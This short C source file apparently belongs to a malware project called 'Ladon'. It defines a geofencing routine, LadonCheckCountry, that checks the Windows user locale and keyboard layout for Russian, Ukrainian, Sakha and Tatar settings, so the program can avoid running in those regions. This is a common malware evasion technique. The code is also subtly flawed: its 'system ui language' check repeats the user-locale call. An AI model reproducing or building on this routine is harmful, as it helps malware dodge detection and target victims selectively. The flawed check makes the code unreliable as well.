#include "ladon.h"

#define LADON_RUSSIA_LOCALE_ID (LCID) 1049
#define LADON_UKRAINE_LOCALE_ID (LCID) 1058
#define LADON_RUSSIAN_LANG_ID (LCID) 0x0419
#define LADON_SAKHA_LANG_ID (LANGID) 0x0485
#define LADON_TATAR_LANG_ID (LANGID) 0x0444
#define LADON_UKRAINIAN_LANG_ID (LANGID) 0x0422

BOOL
LadonCheckCountry()
{
	LCID lLocaleID;
	LANGID lLangID;
	BOOL bStatus = TRUE;

	lLocaleID = _GetUserDefaultLCID();
	bStatus &= !((lLocaleID == LADON_RUSSIA_LOCALE_ID)
		|| (lLocaleID == LADON_UKRAINE_LOCALE_ID));

	/* check default system ui language */
	lLocaleID = _GetUserDefaultLCID();
	bStatus &= !((lLocaleID == LADON_RUSSIA_LOCALE_ID)
		|| (lLocaleID == LADON_UKRAINE_LOCALE_ID));

	/* check keyboard layout */
	lLangID = LOWORD(_GetKeyboardLayout(0));
	bStatus &= !((lLangID == LADON_RUSSIAN_LANG_ID)
		|| (lLangID == LADON_SAKHA_LANG_ID)
		|| (lLangID == LADON_TATAR_LANG_ID)
		|| (lLangID == LADON_UKRAINIAN_LANG_ID));

	return bStatus;
}